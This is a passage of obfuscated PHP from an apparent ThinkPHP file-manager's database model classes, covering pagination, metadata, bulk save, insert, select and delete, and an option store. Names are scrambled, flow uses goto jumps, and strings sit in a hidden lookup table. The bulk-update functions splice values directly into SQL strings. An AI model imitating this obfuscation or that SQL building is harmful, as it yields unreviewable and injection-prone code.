eáµØåœÖ™; Eè¢—£º¤Ù: $this->optionsValue($Eƒã¨„Ç); $EÁµ¹ÄÑ = $this->page($FæÕÃ½İÔ, $dÎ­Ò‚Áö»)->select(); if ($fè¦–åæ‰ == 1) { $E‡îæà¸†æ = count($EÁµ¹ÄÑ); } goto b…¯ºò¥÷; B¦ìºãÒÅÍ: $E‡îæà¸†æ = intval($this->count()); $dÎ­Ò‚Áö» = intval($dÎ­Ò‚Áö»); $dÎ­Ò‚Áö» = $dÎ­Ò‚Áö» <= 5 ? 5 : ($dÎ­Ò‚Áö» >= $dôÙ¾…Óàİ ? $dôÙ¾…Óàİ : $dÎ­Ò‚Áö»); goto b³‘„óçø„; eáµØåœÖ™: $dôÙ¾…Óàİ = 4000; $dÎ­Ò‚Áö» = isset($in[$Eˆö·„ç±Ò[345]]) ? $in[$Eˆö·„ç±Ò[345]] : $dÎ­Ò‚Áö»; if ($dÎ­Ò‚Áö» === -1) { unset($in[$Eˆö·„ç±Ò[345]]); $dôÙ¾…Óàİ = 100000000; $dÎ­Ò‚Áö» = $dôÙ¾…Óàİ; } goto dùƒ›¸²ŠØ; dùƒ›¸²ŠØ: $Aô‚Ù˜­¶ = $Eƒã¨„Ç; $Aô‚Ù˜­¶[$Eˆö·„ç±Ò[346]] = array(); $this->optionsValue($Aô‚Ù˜­¶); goto B¦ìºãÒÅÍ; b³‘„óçø„: $fè¦–åæ‰ = ceil($E‡îæà¸†æ / $dÎ­Ò‚Áö»); $FæÕÃ½İÔ = intval(isset($in[$Eˆö·„ç±Ò[336]]) ? $in[$Eˆö·„ç±Ò[336]] : $FæÕÃ½İÔ); $FæÕÃ½İÔ = $FæÕÃ½İÔ <= 1 ? 1 : ($FæÕÃ½İÔ >= $fè¦–åæ‰ ? $fè¦–åæ‰ : $FæÕÃ½İÔ); goto Eè¢—£º¤Ù; Bƒƒ¼Õ¢–: } protected function checkLength($AóïìØàë, $c„Ç‡„˜İ = 65536) { if (!$AóïìØàë || strlen($AóïìØàë) < $c„Ç‡„˜İ) { return; } show_json(LNG($_SERVER[÷ÖêïÔÔÓ][351]) . "\x28{$c„Ç‡„˜İ}\51", !1); } protected function metaSet($D±”®, $b¡í­ÖÃìÒ = null, $aì†Ç¢âÖ = null) { goto D®›Ó®Šá; b‚¤õí¢Çã: if (is_null($b¡í­ÖÃìÒ)) { return $a¡°¢£ŞÃÉ->where(array($EÔ·éŠ·º  => $D±”®))->delete(); } if (is_null($aì†Ç¢âÖ)) { return $a¡°¢£ŞÃÉ->where($Dî‰Á§Ãí¨)->delete(); } $this->checkLength($aì†Ç¢âÖ); goto cŞ„ÒöŞŞ‘; D®›Ó®Šá: $dÒÅÆ©ø‹µ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->tableMeta) { return !1; } $EÔ·éŠ·º  = $this->tableMeta[$dÒÅÆ©ø‹µ[352]]; goto FåÉ‘Õñæ˜; cŞ„ÒöŞŞ‘: $d¡ä×òË¶ = !1; if ($a¡°¢£ŞÃÉ->where($Dî‰Á§Ãí¨)->find()) { $d¡ä×òË¶ = $a¡°¢£ŞÃÉ->where($Dî‰Á§Ãí¨)->save(array($dÒÅÆ©ø‹µ[356] => $aì†Ç¢âÖ)); } else { $Dî‰Á§Ãí¨[$dÒÅÆ©ø‹µ[354]] = $aì†Ç¢âÖ; $d¡ä×òË¶ = $a¡°¢£ŞÃÉ->add($Dî‰Á§Ãí¨); } return $d¡ä×òË¶; goto c¬ÖéœèÍ£; FåÉ‘Õñæ˜: $a¡°¢£ŞÃÉ = Model($this->tableMeta[$dÒÅÆ©ø‹µ[353]]); if (is_array($b¡í­ÖÃìÒ)) { $A˜÷ëîÆ¡® = array(); foreach ($b¡í­ÖÃìÒ as $B”Šèš¥öø => $A‘áƒöÅòŒ) { $this->checkLength($A‘áƒöÅòŒ); $A˜÷ëîÆ¡®[] = array($EÔ·éŠ·º  => $D±”®, $dÒÅÆ©ø‹µ[88] => $B”Šèš¥öø, $dÒÅÆ©ø‹µ[354] => $A‘áƒöÅòŒ); } $a¡°¢£ŞÃÉ->where(array($EÔ·éŠ·º  => $D±”®))->addAll($A˜÷ëîÆ¡®, array(), !0); return !0; } $Dî‰Á§Ãí¨ = array($EÔ·éŠ·º  => $D±”®, $dÒÅÆ©ø‹µ[355] => $b¡í­ÖÃìÒ); goto b‚¤õí¢Çã; c¬ÖéœèÍ£: } public function metaGet($A¯Õ÷ˆ…ÅÚ) { goto D½ÕæÇ¸¦´; Dö„š¥æ‰¤: $e¨ˆŸö»Š§ = array_to_keyvalue($e¨ˆŸö»Š§, $FßšİèÈï[88], $FßšİèÈï[354]); return $e¨ˆŸö»Š§; goto AÉºß²¿¼; D½ÕæÇ¸¦´: $FßšİèÈï =& $_SERVER[÷ÖêïÔÔÓ]; if (!$this->tableMeta) { return array(); } $C‘ááÅÊ§¬ = $this->tableMeta[$FßšİèÈï[352]]; goto c¹ªù¢µÜ›; c¹ªù¢µÜ›: $D»ˆ‡ëŸ = Model($this->tableMeta[$FßšİèÈï[353]]); $Bµ¾¸òø¯Î = array($C‘ááÅÊ§¬ => $A¯Õ÷ˆ…ÅÚ); $e¨ˆŸö»Š§ = $D»ˆ‡ëŸ->field($FßšİèÈï[357])->where($Bµ¾¸òø¯Î)->select(); goto Dö„š¥æ‰¤; AÉºß²¿¼: } private function checkDataAutoHas($Céø‡½íĞ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $cƒé¶»àºŠ) { if (in_array($Céø‡½íĞ, explode($_SERVER[÷ÖêïÔÔÓ][47], $cƒé¶»àºŠ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$c‹§’Ñá×Ï, $AÇìİ·ÜµĞ) { $a‰ªÕµ’Öì =& $_SERVER[÷ÖêïÔÔÓ]; foreach ($this->dataAuto as $BÁÉ¸ªÍßˆ) { $F¾¬¸Šæ = $BÁÉ¸ªÍßˆ[0]; if (!in_array($AÇìİ·ÜµĞ, explode($a‰ªÕµ’Öì[47], $BÁÉ¸ªÍßˆ[2]))) { continue; } switch (trim($BÁÉ¸ªÍßˆ[3])) { case $a‰ªÕµ’Öì[306]: case $a‰ªÕµ’Öì[307]: $fî¿–¡ªº = $BÁÉ¸ªÍßˆ[1]; $a¿‡Û£çŠä = isset($BÁÉ¸ªÍßˆ[4]) ? (array) $BÁÉ¸ªÍßˆ[4] : array(); if ($fî¿–¡ªº == $a‰ªÕµ’Öì[187] && array_key_exists($F¾¬¸Šæ, $c‹§’Ñá×Ï)) { if (!$c‹§’Ñá×Ï[$F¾¬¸Šæ]) { unset($c‹§’Ñá×Ï[$F¾¬¸Šæ]); } break; } if (isset($c‹§’Ñá×Ï[$F¾¬¸Šæ])) { array_unshift($a¿‡Û£çŠä, $c‹§’Ñá×Ï[$F¾¬¸Šæ]); } if ($a‰ªÕµ’Öì[306] == $BÁÉ¸ªÍßˆ[3]) { $c‹§’Ñá×Ï[$F¾¬¸Šæ] = call_user_func_array($fî¿–¡ªº, $a¿‡Û£çŠä); } else { $c‹§’Ñá×Ï[$F¾¬¸Šæ] = call_user_func_array(array(&$this, $fî¿–¡ªº), $a¿‡Û£çŠä); } break; case $a‰ªÕµ’Öì[258]: $c‹§’Ñá×Ï[$F¾¬¸Šæ] = $c‹§’Ñá×Ï[$BÁÉ¸ªÍßˆ[1]]; break; case $a‰ªÕµ’Öì[279]: if (isset($c‹§’Ñá×Ï[$F¾¬¸Šæ]) && !is_string($c‹§’Ñá×Ï[$F¾¬¸Šæ])) { $c‹§’Ñá×Ï[$F¾¬¸Šæ] = json_encode_force($c‹§’Ñá×Ï[$F¾¬¸Šæ]); } break; case $a‰ªÕµ’Öì[308]: if ($c‹§’Ñá×Ï[$F¾¬¸Šæ] === $a‰ªÕµ’Öì[33]) { unset($c‹§’Ñá×Ï[$F¾¬¸Šæ]); } break; case $a‰ªÕµ’Öì[309]: $c‹§’Ñá×Ï[$F¾¬¸Šæ] = $BÁÉ¸ªÍßˆ[1]; default: break; } } if ($AÇìİ·ÜµĞ == $a‰ªÕµ’Öì[340]) { $f…™­Ë§âó = strtolower($this->db->getDbType()); if (strpos($f…™­Ë§âó, $a‰ªÕµ’Öì[9]) !== 0) { return; } $b–ñ¿íà  = $this->field(!0)->fields; $E‰Ú‹Ã•¤ = $b–ñ¿íà [$a‰ªÕµ’Öì[237]]; if (isset($b–ñ¿íà [$a‰ªÕµ’Öì[236]])) { unset($E‰Ú‹Ã•¤[$b–ñ¿íà [$a‰ªÕµ’Öì[236]]]); } foreach ($E‰Ú‹Ã•¤ as $fÈ­±ë—‘Û => $AÇìİ·ÜµĞ) { if (!isset($c‹§’Ñá×Ï[$fÈ­±ë—‘Û])) { $c‹§’Ñá×Ï[$fÈ­±ë—‘Û] = $a‰ªÕµ’Öì[33]; } } } } private function dataAfterFilter(&$dîåƒö’ “) { $c„‚°íîÉë =& $_SERVER[÷ÖêïÔÔÓ]; foreach ($this->dataAuto as $dĞ±õÂµ”‡) { $Dâïº¶“µç = $dĞ±õÂµ”‡[0]; if (!in_array($c„‚°íîÉë[342], explode($c„‚°íîÉë[47], $dĞ±õÂµ”‡[2]))) { continue; } if (!isset($dîåƒö’ “[$Dâïº¶“µç])) { continue; } switch (trim($dĞ±õÂµ”‡[3])) { case $c„‚°íîÉë[306]: case $c„‚°íîÉë[307]: $BÌ¬ç™´İ» = isset($dĞ±õÂµ”‡[4]) ? (array) $dĞ±õÂµ”‡[4] : array(); array_unshift($BÌ¬ç™´İ», $dîåƒö’ “[$Dâïº¶“µç]); if ($c„‚°íîÉë[306] == $dĞ±õÂµ”‡[3]) { $dîåƒö’ “[$Dâïº¶“µç] = call_user_func_array($dĞ±õÂµ”‡[1], $BÌ¬ç™´İ»); } else { $dîåƒö’ “[$Dâïº¶“µç] = call_user_func_array(array(&$this, $dĞ±õÂµ”‡[1]), $BÌ¬ç™´İ»); } break; case $c„‚°íîÉë[258]: $dîåƒö’ “[$Dâïº¶“µç] = $dîåƒö’ “[$dĞ±õÂµ”‡[1]]; break; case $c„‚°íîÉë[279]: $F÷Üîµ Ûµ = $dîåƒö’ “[$Dâïº¶“µç]; $dîåƒö’ “[$Dâïº¶“µç] = json_decode($F÷Üîµ Ûµ, !0); if (is_null($dîåƒö’ “[$Dâïº¶“µç])) { $dîåƒö’ “[$Dâïº¶“µç] = $F÷Üîµ Ûµ; } break; case $c„‚°íîÉë[308]: if ($dîåƒö’ “[$Dâïº¶“µç] === $c„‚°íîÉë[33]) { unset($dîåƒö’ “[$Dâïº¶“µç]); } break; case $c„‚°íîÉë[309]: $dîåƒö’ “[$Dâïº¶“µç] = $dĞ±õÂµ”‡[1]; default: break; } } } public function saveAll($eˆÒÅ¸ÏæŸ) { goto C…ìÁà‡ïˆ; c—©¥ñĞ•: $DˆÚÆÜ¥­¤ = $AŸ¯î•ËÅ[358]; $A²— ‰µÛñ = 0; $föôï×¿· = array(); goto BšÎË¯–‡; C…ìÁà‡ïˆ: $AŸ¯î•ËÅ =& $_SERVER[÷ÖêïÔÔÓ]; $C×Ûï¾•¼ = $this->tablePrefix . $this->tableName; $f“•“òÔˆ¯ = self::SQL_WHERE_IN_CHUNK; goto c—©¥ñĞ•; BšÎË¯–‡: $CÉà×™è•÷ = count($eˆÒÅ¸ÏæŸ); for ($f¤÷×´ºµ = 0; $f¤÷×´ºµ < $CÉà×™è•÷; $f¤÷×´ºµ++) { $aßÔËã×ƒ = $eˆÒÅ¸ÏæŸ[$f¤÷×´ºµ]; if (!is_array($aßÔËã×ƒ) || count($aßÔËã×ƒ) != 4) { continue; } $cÇ¢Ú¼‹¿ = "\125\120\x44\101\124\105\40{$C×Ûï¾•¼}\40\123\x45\x54\x20{$aßÔËã×ƒ[2]}\x20\75\40\103\x41\x53\105\40{$aßÔËã×ƒ[0]}\40\12"; if ($A²— ‰µÛñ == 0) { $DˆÚÆÜ¥­¤ = $cÇ¢Ú¼‹¿; } $föôï×¿·[] = $AŸ¯î•ËÅ[112] . $aßÔËã×ƒ[1] . $AŸ¯î•ËÅ[112]; $A²— ‰µÛñ++; $DˆÚÆÜ¥­¤ .= "\40\127\x48\x45\116\40\47{$aßÔËã×ƒ[1]}\47\40\124\110\105\116\40\47{$aßÔËã×ƒ[3]}\x27\x20\12"; if ($A²— ‰µÛñ == $f“•“òÔˆ¯ || $f¤÷×´ºµ == $CÉà×™è•÷ - 1) { goto c×ÃÂÊµÌŠ; fÊ“ä¤­¿: $A²— ‰µÛñ = 0; $DˆÚÆÜ¥­¤ = $cÇ¢Ú¼‹¿; $this->chunkEventCheck(count($föôï×¿·)); goto aÚàõ¸Ìˆù; aÚàõ¸Ìˆù: $föôï×¿· = array(); goto EÎ¾ß¦Û·³; c×ÃÂÊµÌŠ: $EÁ ÷£œÂ = implode($AŸ¯î•ËÅ[47], $föôï×¿·); $DˆÚÆÜ¥­¤ .= "\40\x45\116\104\40\40\x57\x48\105\x52\105\x20{$aßÔËã×ƒ[0]}\40\111\x4e\40\50{$EÁ ÷£œÂ}\51\40"; $this->execute($DˆÚÆÜ¥­¤); goto fÊ“ä¤­¿; EÎ¾ß¦Û·³: } } $this->chunkEventSet(); goto d…â‹©…è; d…â‹©…è: } public function saveAllEach($a™¨Ë±Ê¡„) { $eÜŞÁèáİ =& $_SERVER[÷ÖêïÔÔÓ]; $FÇÂİÇ‚ = $this->tablePrefix . $this->tableName; foreach ($a™¨Ë±Ê¡„ as $cÔÛ£Ò®æ) { if (!is_array($cÔÛ£Ò®æ) || count($cÔÛ£Ò®æ) != 4) { continue; } $CÀŸóİõã‘ = $cÔÛ£Ò®æ[0] . $eÜŞÁèáİ[359] . $cÔÛ£Ò®æ[1] . $eÜŞÁèáİ[112]; $e¬”ùÔ³Ô  = $cÔÛ£Ò®æ[2] . $eÜŞÁèáİ[359] . $cÔÛ£Ò®æ[3] . $eÜŞÁèáİ[112]; $Aª¸Ìø»¹ = "\165\x70\144\141\x74\145\40{$FÇÂİÇ‚}\40\163\145\164\40{$e¬”ùÔ³Ô }\40\x77\x68\x65\162\x65\40{$CÀŸóİõã‘}\73"; $this->execute($Aª¸Ìø»¹); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($cî®™™”‡í = false, $bÛº¹ ¾ø = false) { $this->_chunkEvent = $cî®™™”‡í; $this->_chunkEventParam = $bÛº¹ ¾ø; } private function chunkEventCheck($d‰òøË¬Ÿ) { if (!$this->_chunkEvent) { return; } $A‘¸£Å«Ì = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $A‘¸£Å«Ì[$_SERVER[÷ÖêïÔÔÓ][360]] = $d‰òøË¬Ÿ; Hook::trigger($this->_chunkEvent, $A‘¸£Å«Ì); } public function addAll($CîÃ–¸ö‹¬, $a‰Úêğ÷¨½ = array(), $Eá²ÉÕ™ˆÊ = false) { goto dÕ¶×‹À÷×; dÕ¶×‹À÷×: $F·ïò‘ÅåŞ =& $_SERVER[÷ÖêïÔÔÓ]; ignore_timeout(); $dŞ¾ÇÀµÏŒ = self::SQL_WHERE_IN_CHUNK; goto C¿è‚‚Ö¿; CŒÇëºÊõ: if (method_exists($this->db, $F·ïò‘ÅåŞ[257])) { for ($C¸ï‰Áôñœ = 0; $C¸ï‰Áôñœ < count($CîÃ–¸ö‹¬); $C¸ï‰Áôñœ += $dŞ¾ÇÀµÏŒ) { $A±Ã²¼ĞªÀ = array_slice($CîÃ–¸ö‹¬, $C¸ï‰Áôñœ, $dŞ¾ÇÀµÏŒ); if (!is_array($A±Ã²¼ĞªÀ) || count($A±Ã²¼ĞªÀ) == 0) { break; } $B“²ù½Œ£ = $this->db->insertAll($A±Ã²¼ĞªÀ, $a‰Úêğ÷¨½, $Eá²ÉÕ™ˆÊ); $this->chunkEventCheck(count($A±Ã²¼ĞªÀ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($CîÃ–¸ö‹¬ as $fâˆËæÉ»º => $A¯´ïÍùÄğ) { $B“²ù½Œ£ = $this->db->insert($A¯´ïÍùÄğ, $a‰Úêğ÷¨½, $Eá²ÉÕ™ˆÊ); } $this->commit(); } if (!1 !== $B“²ù½Œ£) { $dĞäÆĞµÒ = $this->getLastInsID(); if ($dĞäÆĞµÒ) { return $dĞäÆĞµÒ; } } return $B“²ù½Œ£; goto C·­ïóåÀ×; C¿è‚‚Ö¿: if (empty($CîÃ–¸ö‹¬)) { $this->error = think_lang($F·ïò‘ÅåŞ[256]); return !1; } $a‰Úêğ÷¨½ = $this->_parseOptions($a‰Úêğ÷¨½); foreach ($CîÃ–¸ö‹¬ as $fâˆËæÉ»º => $A¯´ïÍùÄğ) { $CîÃ–¸ö‹¬[$fâˆËæÉ»º] = $this->_facade($A¯´ïÍùÄğ); $this->_beforeInsert($CîÃ–¸ö‹¬[$fâˆËæÉ»º], $a‰Úêğ÷¨½); } goto CŒÇëºÊõ; C·­ïóåÀ×: } public function save($CÀŠ«¹ÊÃš = '', $eêñÁ›¦ÂÍ = array()) { goto b’¦†÷ŠçŒ; b’¦†÷ŠçŒ: $a´Ç Šäêè =& $_SERVER[÷ÖêïÔÔÓ]; $FßåÙĞÜƒ = self::SQL_WHERE_IN_CHUNK; $e¤îñ¨Ò§ = $this->optionsValue(); goto D‚‰Ñ¯ƒÃÕ; fÃ¸‹Î‹İ‘: $this->chunkEventSet(); return $eó˜‹Ô‰·‰; goto f×ğ‡’Âõ; fÃˆÖ ©¶: $céÈŒ„ìÊ = $e¤îñ¨Ò§[$a´Ç Šäêè[260]][$eà®åèõ´ù][1]; $E‚‘îİùÖŠ = count($céÈŒ„ìÊ); for ($aàµ‹æÓ‡ù = 0; $aàµ‹æÓ‡ù < $E‚‘îİùÖŠ; $aàµ‹æÓ‡ù += $FßåÙĞÜƒ) { $fˆ»ŒØê¦ˆ = array_slice($céÈŒ„ìÊ, $aàµ‹æÓ‡ù, $FßåÙĞÜƒ); if (!is_array($fˆ»ŒØê¦ˆ) || count($fˆ»ŒØê¦ˆ) == 0) { break; } $e¤îñ¨Ò§[$a´Ç Šäêè[260]][$eà®åèõ´ù][1] = $fˆ»ŒØê¦ˆ; $this->optionsValue($e¤îñ¨Ò§); $eó˜‹Ô‰·‰ += parent::save($CÀŠ«¹ÊÃš, $eêñÁ›¦ÂÍ); $this->chunkEventCheck(count($fˆ»ŒØê¦ˆ)); } goto fÃ¸‹Î‹İ‘; D‚‰Ñ¯ƒÃÕ: $eà®åèõ´ù = $this->findWhereField($e¤îñ¨Ò§); if (!$eà®åèõ´ù) { return parent::save($CÀŠ«¹ÊÃš, $eêñÁ›¦ÂÍ); } $eó˜‹Ô‰·‰ = 0; goto fÃˆÖ ©¶; f×ğ‡’Âõ: } public function add($CÒÆŒÄîÒ‘ = '', $e‘äØà–Ù = array(), $d³ğ¼Èá‚ = false) { if ($this->addTaskStatus && is_array($CÒÆŒÄîÒ‘)) { $this->addTaskData[] = $CÒÆŒÄîÒ‘; return; } return parent::add($CÒÆŒÄîÒ‘, $e‘äØà–Ù, $d³ğ¼Èá‚); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($CßÌÃÖ„ = array()) { goto DÛ±ÆãŠµä; DÛ±ÆãŠµä: $f…‚ÒĞ¾‚é =& $_SERVER[÷ÖêïÔÔÓ]; $cÑÚºÇŸÌ÷ = self::SQL_WHERE_IN_CHUNK; $a²ÈôÉÁëá = $this->optionsValue(); goto f—¿¸ ¹¬; f—¿¸ ¹¬: $CóË™ø–Ñ = $this->findWhereField($a²ÈôÉÁëá); if (!$CóË™ø–Ñ || isset($a²ÈôÉÁëá[$f…‚ÒĞ¾‚é[277]]) || isset($a²ÈôÉÁëá[$f…‚ÒĞ¾‚é[336]])) { return parent::select($CßÌÃÖ„); } $FÖôĞÜÓ¯å = $a²ÈôÉÁëá[$f…‚ÒĞ¾‚é[260]][$CóË™ø–Ñ][1]; goto BëÕ— ‘Ş¥; BëÕ— ‘Ş¥: $D»Œ²¡º = null; for ($EÁÛº‡—â = 0; $EÁÛº‡—â < count($FÖôĞÜÓ¯å); $EÁÛº‡—â += $cÑÚºÇŸÌ÷) { $d¡ôƒÈÇÉ³ = array_slice($FÖôĞÜÓ¯å, $EÁÛº‡—â, $cÑÚºÇŸÌ÷); if (!is_array($d¡ôƒÈÇÉ³) || count($d¡ôƒÈÇÉ³) == 0) { break; } $a²ÈôÉÁëá[$f…‚ÒĞ¾‚é[260]][$CóË™ø–Ñ][1] = $d¡ôƒÈÇÉ³; $this->optionsValue($a²ÈôÉÁëá); $f‹½£’ÎÚÛ = parent::select($CßÌÃÖ„); if (!$f‹½£’ÎÚÛ) { continue; } if (is_null($D»Œ²¡º)) { $D»Œ²¡º = array(); } $D»Œ²¡º = array_merge($D»Œ²¡º, $f‹½£’ÎÚÛ); } return $D»Œ²¡º; goto A¯ƒÏë˜õã; A¯ƒÏë˜õã: } public function delete($DñÄÅŸß“å = array()) { goto c´¨‰°Ùéù; c´¨‰°Ùéù: $F¯Œ¦îˆ =& $_SERVER[÷ÖêïÔÔÓ]; $DÌç¶Ğ” = self::SQL_WHERE_IN_CHUNK; $f‰Ã™˜«…Š = $this->optionsValue(); goto c¶¶ç‚Û›; a¯“Ÿœ³«¦: $C«£‡¡œâĞ = $f‰Ã™˜«…Š[$F¯Œ¦îˆ[260]][$FÙ¾¬…Ù•ì][1]; for ($aÆâÜŒ„¿¿ = 0; $aÆâÜŒ„¿¿ < count($C«£‡¡œâĞ); $aÆâÜŒ„¿¿ += $DÌç¶Ğ”) { $B‡¨¢«× = array_slice($C«£‡¡œâĞ, $aÆâÜŒ„¿¿, $DÌç¶Ğ”); if (!is_array($B‡¨¢«×) || count($B‡¨¢«×) == 0) { break; } $f‰Ã™˜«…Š[$F¯Œ¦îˆ[260]][$FÙ¾¬…Ù•ì][1] = $B‡¨¢«×; $this->optionsValue($f‰Ã™˜«…Š); $b…„•Ä÷Ü³ += parent::delete($DñÄÅŸß“å); } return $b…„•Ä÷Ü³; goto d­»ŒßæÈß; c¶¶ç‚Û›: $FÙ¾¬…Ù•ì = $this->findWhereField($f‰Ã™˜«…Š); if (!$FÙ¾¬…Ù•ì) { return parent::delete($DñÄÅŸß“å); } $b…„•Ä÷Ü³ = 0; goto a¯“Ÿœ³«¦; d­»ŒßæÈß: } private function findWhereField($B¹Ø½ÛÊ§) { $F÷ËéÍ³Ë =& $_SERVER[÷ÖêïÔÔÓ]; $d†ÃãŠÙ’¬ = self::SQL_WHERE_IN_CHUNK; if (!is_array($B¹Ø½ÛÊ§) || !is_array($B¹Ø½ÛÊ§[$F÷ËéÍ³Ë[260]])) { return !1; } foreach ($B¹Ø½ÛÊ§[$F÷ËéÍ³Ë[260]] as $fŸŸº·º => $BÌê®”ò¯) { if (is_array($BÌê®”ò¯) && isset($BÌê®”ò¯[0]) && is_string($BÌê®”ò¯[0]) && strtolower($BÌê®”ò¯[0]) == $F÷ËéÍ³Ë[7] && is_array($BÌê®”ò¯[1]) && count($BÌê®”ò¯[1]) > $d†ÃãŠÙ’¬) { ignore_timeout(); return $fŸŸº·º; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\x74\145\155\117\x70\164\151\x6f\x6e"; public $field = array(); public function listData($C¹¸É®„È’ = false, $a”›ÃÑí = "\155\157\144\x69\146\171\124\151\155\x65", $B—©ˆÜ¹Ô· = false) { $c’…ÍÄ¾œ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$C¹¸É®„È’) { $c’…ÍÄ¾œ = array_filter(array_values($c’…ÍÄ¾œ)); return array_sort_by($c’…ÍÄ¾œ, $a”›ÃÑí, $B—©ˆÜ¹Ô·); } return $c’…ÍÄ¾œ[$_SERVER[÷ÖêïÔÔÓ][361] . $C¹¸É®„È’]; } public function insert($D»ÑÌÕÁ¹ç) { goto CÚÍ©æ½ƒ‚; c÷õÜ›ŞÓ: return $FÙÉÂä÷; goto aƒî¦Š•Éõ; A¸ñäËÙ•¾: $D»ÑÌÕÁ¹ç[$A¯ºÎè²œŸ[106]] = time(); Model($this->modelType)->set($A¯ºÎè²œŸ[362], $FÙÉÂä÷, $this->optionType . $A¯ºÎè²œŸ[363]); Model($this->modelType)->set($A¯ºÎè²œŸ[361] . $FÙÉÂä÷, $D»ÑÌÕÁ¹ç, $this->optionType); goto c÷õÜ›ŞÓ; CÚÍ©æ½ƒ‚: $A¯ºÎè²œŸ =& $_SERVER[÷ÖêïÔÔÓ]; $D»ÑÌÕÁ¹ç = array_field_key($D»ÑÌÕÁ¹ç, $this->field); $FÙÉÂä÷ = Model($this->modelType)->get($A¯ºÎè²œŸ[362], $this->optionType . $A¯ºÎè²œŸ[363]); goto F¤©ÏÛµâİ; F¤©ÏÛµâİ: $FÙÉÂä÷ = $FÙÉÂä÷ ? $FÙÉÂä÷ : 0; $D»ÑÌÕÁ¹ç[$A¯ºÎè²œŸ[364]] = ++$FÙÉÂä÷; $D»ÑÌÕÁ¹ç[$A¯ºÎè²œŸ[184]] = time(); goto A¸ñäËÙ•¾; aƒî¦Š•Éõ: } public function update($dµÆïí©Çù, $BˆÓîõÎ ç) { goto B¥ïíñŠù·; DœÖæŠå°ñ: return Model($this->modelType)->set($eš§ìÑ¶Ù˜[361] . $dµÆïí©Çù, $BˆÓîõÎ ç, $this->optionType); goto f³”šä¤ô´; B¥ïíñŠù·: $eš§ìÑ¶Ù˜ =& $_SERVER[÷ÖêïÔÔÓ]; $BˆÓîõÎ ç = array_field_key($BˆÓîõÎ ç, $this->field); $dÄƒÁ¿Ï‰² = $this->listData($dµÆïí©Çù); goto C‰ô¦ˆ˜éï; C‰ô¦ˆ˜éï: if (!$dÄƒÁ¿Ï‰²) { return !1; } $BˆÓîõÎ ç = array_merge($dÄƒÁ¿Ï‰², $BˆÓîõÎ ç); $BˆÓîõÎ ç[$eš§ìÑ¶Ù˜[106]] = time(); goto DœÖæŠå°ñ; f³”šä¤ô´: } public function remove($a¾ùÏÆ¥ç ) { return Model($this->modelType)->remove($_SERVER[÷ÖêïÔÔÓ][361] . $a¾ùÏÆ¥ç , $this->optionType); } public function clear() { $eÖ¸ÎŒ…¼˜ =& $_SERVER[÷ÖêïÔÔÓ]; Model($this->modelType)->remove($eÖ¸ÎŒ…¼˜[362], $this->optionType . $eÖ¸ÎŒ…¼˜[363]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($C¦÷‰µÓ, $Fœà¢Úáß) { if (!$Fœà¢Úáß) { return !1; } $a¾ÑÜçŠŞÂ = $this->listData(); $a¾ÑÜçŠŞÂ = array_to_keyvalue($a¾ÑÜçŠŞÂ, $C¦÷‰µÓ); return isset($a¾ÑÜçŠŞÂ[$Fœà¢Úáß]) ? $a¾ÑÜçŠŞÂ[$Fœà¢Úáß] : !1; } public function findByName($fà‡ÙÓœ±›) { return $this->findByKey($_SERVER[÷ÖêïÔÔÓ][28], $fà‡ÙÓœ±›); } protected function resetData($e†‡íëç›) { $FÕÂ­ñƒò• =& $_SERVER[÷ÖêïÔÔÓ]; $EªòìÎ˜’… = array(); for ($D¼ÁÁÖõõ¸ = 0; $D¼ÁÁÖõõ¸ < count($e†‡íëç›); $D¼ÁÁÖõõ¸++) { $EªòìÎ˜’…[$FÕÂ­ñƒò•[361] . $e†‡íëç›[$D¼ÁÁÖõõ¸][$FÕÂ­ñƒò•[364]]] = $e†‡íëç›[$D¼ÁÁÖõõ¸]; } return Model($this->modelType)->set($EªòìÎ˜’…, !1, $this->optionType); } private function getAutoName($AÈÕš±—ÏÚ) { $F´¯Å”ºÜ» = array_to_keyvalue($this->listData(), $_SERVER[÷ÖêïÔÔÓ][28]); if (!$F´¯Å”ºÜ» || !isset($F´¯Å”ºÜ»[$AÈÕš±—ÏÚ])) { return $AÈÕš±—ÏÚ; } for ($f†½«Ö´®á = 1; $f†½«Ö´®á < count($F´¯Å”ºÜ»); $f†½«Ö´®á++) { $AŠ¼ó¦ÊÛ = $AÈÕš±—ÏÚ . "\x28{$f†½«Ö´®á}\51"; if (!isset($F´¯Å”ºÜ»[$AŠ¼ó¦ÊÛ])) { return $AŠ¼ó¦ÊÛ; } } return $AŠ¼ó¦ÊÛ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($F“Õ½Ôø± = false, $Aßç”„š™ = '', $D®­…Êø†§ = false) { goto DöŒ ´¡Æ; EŠœŒÎÁÀË: $D£İõ­ºŠ = $this->filterWhere(array($dŸÈ­ªŒòç[29] => $Aßç”„š™)); $eòíó¬Æî¿ = $this->where($D£İõ­ºŠ)->select(); $eòíó¬Æî¿ = array_to_keyvalue($eòíó¬Æî¿, $dŸÈ­ªŒòç[88], $dŸÈ­ªŒòç[354]); goto E™‡íÅËØ¿; DöŒ ´¡Æ: $dŸÈ­ªŒòç =& $_SERVER[÷ÖêïÔÔÓ]; $eòíó¬Æî¿ = $this->cacheGet($Aßç”„š™); if (is_array($eòíó¬Æî¿)) { return $F“Õ½Ôø± ? isset($eòíó¬Æî¿[$F“Õ½Ôø±]) ? $eòíó¬Æî¿[$F“Õ½Ôø±] : null : $eòíó¬Æî¿; } goto EŠœŒÎÁÀË; E™‡íÅËØ¿: foreach ($eòíó¬Æî¿ as $bÈ‚æ¹ïé => $d´…Œ ‰Ø‰) { if ($D®­…Êø†§ || in_array($bÈ‚æ¹ïé, $this->jsonField)) { $eòíó¬Æî¿[$bÈ‚æ¹ïé] = 